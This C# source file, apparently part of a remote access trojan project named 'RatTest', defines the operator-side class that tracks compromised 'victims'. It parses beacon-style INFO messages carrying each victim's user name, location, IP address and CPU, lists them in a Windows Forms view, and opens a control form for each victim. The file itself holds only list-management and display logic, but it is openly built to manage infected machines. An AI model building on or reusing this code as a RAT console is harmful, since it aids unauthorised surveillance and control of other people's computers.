using System;
using System.Collections;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Text;

namespace RatTest
{
    class VictimListManager : IList<Victim>
    {
        List<Victim> victims = new List<Victim>();
        ListView listView;
        public delegate void ReceiveEvent(Victim v, string data);
        public event ReceiveEvent Receive;

        //-------------------------------------------------
        public void ReceiveMessage(Victim v, string data)
        {

            if (Receive != null)
                Receive.Invoke(v, data);
            Parser(v, data);

        }
        //-------------------------------------------------
        public void Parser(Victim v,string rawData)
        {
            string[] temp = rawData.Split('|');
            string Prefix = temp[0];
            string Message = "";
            for (int i = 1; i < temp.Length; i++) { Message += temp[i]; }
            switch ( Prefix )
            {
                //#####################################################
                case "INFO":
                    v.SetInfo(Message);
                    int i = victims.IndexOf(v);
                    if (i < 0) break;
                    listView.Items[i].SubItems.Add(v.User);
                    listView.Items[i].SubItems.Add(v.Location);
                    listView.Items[i].SubItems.Add(v.NetIP);
                    listView.Items[i].SubItems.Add(v.CPU);
                    break;
                    

            }
        }
        //-------------------------------------------------
        public VictimListManager(ListView lv)
        {
            listView = lv;
            listView.View = View.Details;
            listView.Columns.Add("ID", 100, HorizontalAlignment.Left);
            listView.Columns.Add("User", 100, HorizontalAlignment.Left);
            //listView.Columns.Add("windows", 100, HorizontalAlignment.Left);
            listView.Columns.Add("Location", 100, HorizontalAlignment.Left);
            listView.Columns.Add("NetIP", 100, HorizontalAlignment.Left);
            listView.Columns.Add("CPU", 100, HorizontalAlignment.Left);
            listView.Columns.Add("RAM", 100, HorizontalAlignment.Left);
            listView.MouseDoubleClick += ListView_MouseDoubleClick;

        }
        //_________________________________________________
        private void ListView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            ListViewHitTestInfo test = listView.HitTest(e.X, e.Y);
            if (test.Item != null)
                new FormVictim(victims[test.Item.Index]).Show();
        }
        //_________________________________________________
        public Victim this[int index]
        {
            get
            {
                return victims[index];
            }

            set
            {
                victims[index] = value;
            }
        }
        //_________________________________________________
        public int Count
        {
            get
            {
                return victims.Count;
            }
        }
        //_________________________________________________
        public bool IsReadOnly
        {
            get
            {
                return false;
            }
        }
        //_________________________________________________
        public void Add(Victim item)
        {
            victims.Add(item);
            ListViewItem i = listView.Items.Add(item.ID + "");
        }
        //_________________________________________________
        public void Clear()
        {
            victims.Clear();
        }
        //_________________________________________________
        public bool Contains(Victim item)
        {
            return victims.Contains(item);
        }
        //_________________________________________________
        public void CopyTo(Victim[] array, int arrayIndex)
        {
            throw new NotImplementedException();
        }
        //_________________________________________________
        public IEnumerator<Victim> GetEnumerator()
        {
            return victims.GetEnumerator();
        }
        //_________________________________________________
        public int IndexOf(Victim item)
        {
            return victims.IndexOf(item);
        }
        //_________________________________________________
        public void Insert(int index, Victim item)
        {
            victims.Insert(index, item);
        }
        //_________________________________________________
        public bool Remove(Victim item)
        {
            int index = victims.IndexOf(item);
            listView.Items.RemoveAt(index);
            return victims.Remove(item);
        }
        //_________________________________________________
        public void RemoveAt(int index)
        {
            victims.RemoveAt(index);
        }
        //_________________________________________________
        IEnumerator IEnumerable.GetEnumerator()
        {
            return victims.GetEnumerator();
        }
        //_________________________________________________

    }
}
